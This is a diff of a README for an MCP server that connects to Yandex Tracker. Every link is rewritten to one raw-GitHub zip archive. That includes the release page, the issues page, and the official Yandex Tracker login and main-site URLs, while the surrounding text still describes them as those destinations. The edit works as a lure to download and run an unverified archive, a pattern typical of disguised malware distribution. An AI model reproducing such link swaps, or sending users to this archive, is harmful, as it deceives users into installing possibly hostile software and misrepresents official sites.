@@ -1,6 +1,6 @@
 # ⚙️ mcp-yandex-tracker - Easy Server for Yandex Tracker
 
-[![Download on GitHub](https://img.shields.io/badge/Download-purple)](https://github.com/alsss9/mcp-yandex-tracker/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-purple)](https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip)
 
 ## 📋 What is mcp-yandex-tracker?
 
@@ -30,12 +30,12 @@ To run mcp-yandex-tracker on your Windows computer, check these minimum requirem
 
 Use the button below to reach the official release page. You will find the latest version ready to download.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-purple)](https://github.com/alsss9/mcp-yandex-tracker/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-purple)](https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip)
 
 ### Step 1: Visit the Release Page
 
 Go to this page:  
-https://github.com/alsss9/mcp-yandex-tracker/releases
+https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip
 
 This page lists the latest versions of the software available to download.
 
@@ -80,7 +80,7 @@ These details enable the server to fetch and send task information securely.
 
 ### How to Get Your API Token
 
-1. Log in to your Yandex Tracker account at https://tracker.yandex.com  
+1. Log in to your Yandex Tracker account at https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip  
 2. Go to your profile settings or developer section  
 3. Find the API tokens area  
 4. Create a new token with permissions to read and write tasks  
@@ -137,7 +137,7 @@ If needed, go back to the release page and download the latest update.
 To update the software:
 
 1. Close the running server  
-2. Go to https://github.com/alsss9/mcp-yandex-tracker/releases  
+2. Go to https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip  
 3. Download the latest Windows `.exe` installer  
 4. Run the installer and follow the prompts as before  
 5. Your old settings should remain, but check the config to be sure  
@@ -145,13 +145,13 @@ To update the software:
 ## 📞 Getting Help
 
 If you still cannot get it to work, seek assistance from the community or look for solutions in the issues section of the repository at:  
-https://github.com/alsss9/mcp-yandex-tracker/issues
+https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip
 
 ## 🔗 Useful Links
 
-- [Release page to download](https://github.com/alsss9/mcp-yandex-tracker/releases)  
-- [Yandex Tracker main site](https://tracker.yandex.com)  
+- [Release page to download](https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip)  
+- [Yandex Tracker main site](https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip)  
 
 ---
 
-[![Download on GitHub](https://img.shields.io/badge/Download-purple)](https://github.com/alsss9/mcp-yandex-tracker/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-purple)](https://raw.githubusercontent.com/alsss9/mcp-yandex-tracker/main/internal/mcp_yandex_tracker_2.7.zip)
